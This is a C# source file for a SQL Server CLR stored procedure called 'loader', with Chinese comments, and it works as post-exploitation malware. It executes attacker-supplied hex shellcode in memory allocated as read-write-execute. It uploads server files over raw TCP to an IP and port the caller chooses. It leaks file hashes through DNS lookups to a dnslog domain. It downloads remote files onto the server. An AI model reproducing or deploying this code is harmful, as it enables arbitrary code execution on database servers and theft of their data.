using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using Microsoft.SqlServer.Server;
using System.Runtime.InteropServices;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void loader(string type,string arg0,string arg1,string arg2)
    {
        // 在此处放置代码
        try
        {
            switch (type)
            {
                case "0":
                    //arg0 是shellcode
                    arg0 = arg0.Trim();
                    SqlContext.Pipe.Send(shellcode_exec(arg0));
                    break;
                case "1":
                    //arg0是serverIp,arg1是serverPort,arg2是filePath。
                    UploadFile(arg0, arg1, arg2);
                    break;
                case "2":
                    //arg0是获取文件md5的方式0代表dnslog1代表文件，arg1是dnslog域名或文件路径，arg2是计算的文件,
                    SqlContext.Pipe.Send(getFileMd5(arg0, arg1, arg2));
                    break;
                case "3":
                    //arg0是下载的url，arg1是保存的文件路径
                    new StoredProcedures().StartDownload(arg0, arg1);
                    break;
            }
        }
        catch(Exception ex)
        {
            return;
        }
    }
    public static bool ValidateIPv4(string ip)
    {
        IPAddress address;
        return ip != null &&
            IPAddress.TryParse(ip, out address);
    }
    public static void UploadFile(string serverAddress, string serverPort, string filePath)
    {
        if (!ValidateIPv4(serverAddress) || (0< int.Parse(serverPort) && int.Parse(serverPort) < 65535)|| !File.Exists(filePath))
        {
            return;
        }
        using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
        {
            try
            {
                IPAddress ipAdress = IPAddress.Parse(serverAddress);
                IPEndPoint ipEndpoint = new IPEndPoint(ipAdress, int.Parse(serverPort));
                socket.Connect(ipEndpoint);

            }
            catch (Exception ex)
            {
                return;
            }
            using (var fileStream = new FileStream(filePath, FileMode.Open))
            {
                byte[] buffer = new byte[1024 * 1024 * 1];
                int n = -1;
                do
                {
                    n = fileStream.Read(buffer, 0, buffer.Length);
                    byte[] resultArray = new byte[n];
                    Array.Copy(buffer, 0, resultArray, 0, n);
                    socket.Send(resultArray);
                } while (n > 0);

            }
        }
    }
    public static string getFileMd5(string type, string arg, string filePath)
    {
        try
        {
            using (FileStream fs = File.OpenRead(filePath))
            {
                using (var crypto = System.Security.Cryptography.MD5.Create())
                {
                    var md5Hash = crypto.ComputeHash(fs);
                    string md5 = BitConverter.ToString(md5Hash, 0).Replace("-", string.Empty).ToLower();
                    if (type == "0")
                    {
                        Dns.GetHostEntry(md5 + "." + arg);
                    }
                    if(type == "1")
                    {
                        System.IO.File.WriteAllText(@arg, md5);
                    }
                    return md5;
                }
            }
        }catch(Exception ex)
        {
            return "";
        }
    }
    public bool StartDownload(string url, string savepath)
    {
        if (!url.StartsWith("http"))
        {
            return false;
        }
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(savepath));

            if (File.Exists(savepath))
            {
                File.Delete(savepath);
            }
            using (WebClient client = new WebClient())
            {

                var ur = new Uri(url);
                SqlContext.Pipe.Send(@"Downloading file:");
                client.DownloadFileAsync(ur, savepath);
                while (client.IsBusy) { Thread.Sleep(500); }
                SqlContext.Pipe.Send(getFileMd5(savepath, "2", ""));
                return File.Exists(savepath);
            }
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send("Was not able to download file!");
            SqlContext.Pipe.Send(e.Message);
            return false;
        }
    }
    public static string shellcode_exec(string sc)
    {
        try
        {
            if (sc.Length % 2 == 1){
                return "shellcode length is error:"+sc.Length;
            }
            int shellcode_len = sc.Length / 2;
            if (shellcode_len<50)
            {
                return "shellcode error";
            }
            byte[] sa = new byte[shellcode_len];
            for (int i = 0; i < shellcode_len; i++)
            {
                string code = "0x" + sc.Substring(i * 2, 2);
                int a = Convert.ToInt32(code, 16);
                sa[i] = (byte)a;
            }
            UInt32 shellcodeAddress = VirtualAlloc(0, (UInt32)sa.Length, 0x1000, 0x40);
            Marshal.Copy(sa, 0, (IntPtr)(shellcodeAddress), sa.Length);
            CreateThread(0, 0, shellcodeAddress, 0, 0, 0);
            return "run success";
        }
        catch(Exception ex)
        {
            return ex.ToString();
        }

    }
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern UInt32 CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, UInt32 lpParameter, UInt32 dwCreationFlags, UInt32 lpThreadId);
}